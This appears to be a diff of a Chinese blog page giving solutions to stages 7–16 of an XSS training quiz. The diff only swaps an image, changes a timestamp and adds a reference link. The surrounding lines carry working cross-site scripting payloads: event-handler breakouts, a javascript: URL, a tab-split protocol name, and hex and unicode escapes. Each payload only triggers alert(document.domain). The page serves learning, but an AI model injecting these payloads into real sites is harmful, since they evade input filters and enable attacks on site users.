@@ -112,10 +112,10 @@
 <meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/xss3.gif">
 <meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/xss4.png">
 <meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/x3.png">
-<meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/x3.png">
+<meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/x99.png">
 <meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/xss12.png">
 <meta property="og:image" content="http://owrmua5nw.bkt.clouddn.com/x13.png">
-<meta property="og:updated_time" content="2017-12-03T05:26:53.495Z">
+<meta property="og:updated_time" content="2017-12-03T05:30:13.418Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS">
 <meta name="twitter:description" content="XSS简单使用">
@@ -403,7 +403,7 @@
 <h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=2e71a47a9c7061dcce2b9205b52f4252bd53b443" target="_blank" rel="external">第七关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">123&quot; onfocusin=alert(document.domain)     autofocus x=&quot;</div></pre></td></tr></table></figure></p>
 <h3 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h3><p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=8407d42ea5cf46b072f5a358abffa591a449a2ba" target="_blank" rel="external">第八关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">javascript:alert(document.domain); </div><div class="line"></div><div class="line">js伪协议</div></pre></td></tr></table></figure></p>
 <h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=fcf3010be4306306e9668ee51b9d6916c0b3e129c" target="_blank" rel="external">第九关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&quot; onmousemove=&quot;alert(document.domain)</div><div class="line">这个它提示是时utf-7..但是我转码utf-7 +号也转成%2b了，还是没过去，不知道为啥，最后用firebug。</div></pre></td></tr></table></figure></p>
-<p><img src="http://owrmua5nw.bkt.clouddn.com/x3.png" alt="x99"></p>
+<p><img src="http://owrmua5nw.bkt.clouddn.com/x99.png" alt="x99"></p>
 <h3 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h3><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=718360225fa9356a42c30995f38b5142c3496f6a" target="_blank" rel="external">第十关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&lt;/input&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;&lt;input value=&quot;</div></pre></td></tr></table></figure></p>
 <h3 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h3><p><a href="http://xss-quiz.int21h.jp/stage11th.php?sid=b0a460cbd0a1ced63918634d08b73d98306564c3" target="_blank" rel="external">第十一关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&quot;&lt;/input&gt;&lt;a href=&quot;javascr&amp;#09ipt:alert(document.domain);&quot;&gt;lxhsec&lt;/a&gt;&lt;input value=&quot;</div><div class="line"></div><div class="line">&amp;#09 制表符。换行符，回车符应该也是可以得。</div></pre></td></tr></table></figure></p>
 <h3 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h3><p><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=92cf5e7d054ddc022223097c5bb5f622b60ac857" target="_blank" rel="external">第十二关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">``onmousemove=alert(document.domain);</div><div class="line"></div><div class="line">``这个要在ie中才会被解析。</div><div class="line">我测试的是ie版本为6.0</div></pre></td></tr></table></figure></p>
@@ -414,6 +414,7 @@
 <h3 id="15"><a href="#15" class="headerlink" title="15."></a>15.</h3><p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=1e785fb96bdb203c00b034203ee574681d1b4403" target="_blank" rel="external">第十五关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</div><div class="line"></div><div class="line">\\ -&gt; \</div></pre></td></tr></table></figure></p>
 <h3 id="16"><a href="#16" class="headerlink" title="16."></a>16.</h3><p><a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=ef6e91b383462a2d0855b1611b49193b1940d8e6" target="_blank" rel="external">第十六关</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hogehoge\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</div><div class="line"></div><div class="line">js中不仅支持unicode 还支持八进制，十六进制。</div></pre></td></tr></table></figure></p>
 <p>个人理解，仅供参考。</p>
+<p><a href="http://www.freebuf.com/articles/web/20282.html" target="_blank" rel="external">参考资料</a></p>
 
       
     </div>
